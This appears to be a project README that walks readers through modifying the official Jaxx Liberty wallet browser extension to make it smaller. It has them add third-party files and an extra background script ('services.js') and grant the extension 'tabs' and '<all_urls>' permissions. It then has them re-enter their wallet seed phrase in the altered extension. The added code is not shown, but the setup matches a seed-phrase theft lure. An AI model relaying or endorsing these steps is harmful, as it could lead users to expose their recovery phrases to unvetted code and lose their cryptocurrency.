# For who love jaxx.io

## Features
- The Jaxx Liberty for Desktop is more than 100Mb. This library can do it with **~4KB**... better performance.

## Important
- **Backup your wallet, phrase information before doing anything next.**
- To avoid all of allegations relate to the privacy in futures, you must to build this app by yourself, please understand that because your crypto wallet safety. Don't wories, it's easy. You even don't need any developer skill to build this app with my library, but please consult with your trusted technical representative for helpful advice.
- I cannot ensure or warrant the security of this scripts, so use at your own risk. I'm not responsible for anything that happens due to you using this script!


<p align="center"><img src="https://i.imgur.com/80psMJQ.png"></p>

## Let build it.
#### (*) You must install the [official Jaxx Liberty extension on chrome webstore](https://chrome.google.com/webstore/detail/jaxx-liberty/cjelfplplebdjjenllpjcblmjkfcffne) first
##### - If you seen "unzip error" and it can't download able, you can try some tips (use at your own risk): Visit crxdown.com or crxextractor.com, etc. Then paste chrome webstore url to download crx. After download crx, visit crxextractor.com, and upload that crx file to extract and convert .crx to .zip file, just skip step's one, once you've done this.
##### - English isn't my first language, im working on improving.... so please excuse any mistakes in this post..
<ol>
  <li>Access <code>chrome://version/</code> and get your <u>Profile Path</u>, if you use Chrome, it's looklike <code>...\Google\Chrome\User Data\Default\</code> , now you access folder <code>Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code> inside your <u>Profile Path</u>.
 <ul>
    <li>CentBrowser can quick access: <code>%AppData%\..\Local\CentBrowser\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code>
      <br><br>Google Chrome can quick access: <code>%AppData%\..\Local\Google\Chrome\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code>
      <br><br>CocCoc Browser can quick access: <code>%AppData%\..\Local\CocCoc\Browser\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code>
      <br><br>Edge Browser can quick access: <code>%AppData%\..\Local\Microsoft\Edge\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code>
      </li>
</ul></li>
  <li>If you installed lastest Jaxx version, that folder is <code>2.4.6.0_0</code>just make a copy of that folder to another location, e.g <code>C:\2.4.6.0_0</code>, we will build the app here.</li>
  <li>Download <a href="https://github.com/Brahmulr/jaxx.io-smApp/releases/latest">lastest releases</a> library, unzip and move these files to <code>C:\2.4.6.0_0\</code></li>
</ol>


### Now we need edit, you can use notepad or any text-editor.
- Please careful with commas (`,`) and line break.

##### C:\2.4.6.0_0\manifest.json

Change `"default_popup": "index.html"` =>  `"default_popup": "pop.html"`

Change `"permissions": [` =>  `"permissions": ["tabs","<all_urls>",`

Change `"background.js",` =>  `"background.js","services.js",`

After edited, `manifest.json` looklike <a href="https://i.imgur.com/lQfFva0.png">this image</a>

Save it.


##### C:\2.4.6.0_0\index.html
Change `</head>` =>  `<link rel="stylesheet" href="mod_themes.css"></head>`

After edited, `index.html` looklike <a href="https://i.imgur.com/FEpFBhA.png">this image</a>

Save it.

## You've done! Let install new app.
- If you like this project, fell free to use, [give me a star](https://github.com/Brahmulr/jaxx.io-smApp/stargazers), or donate for me via ethereum : `0x9Fc6c9554B2eC78b55bfAc4A23240318f06614af` ♥️
### Open chrome, then access `chrome://extensions/` URL

<p align="center"><img src="https://i.imgur.com/bo64nXe.png"></p>

### You can now click on the icon of Jaxx Liberty extension to use, let start to recover that your backed-up's wallet - phrase

<p align="center"><img src="https://i.imgur.com/fnjXzMc.png"></p>
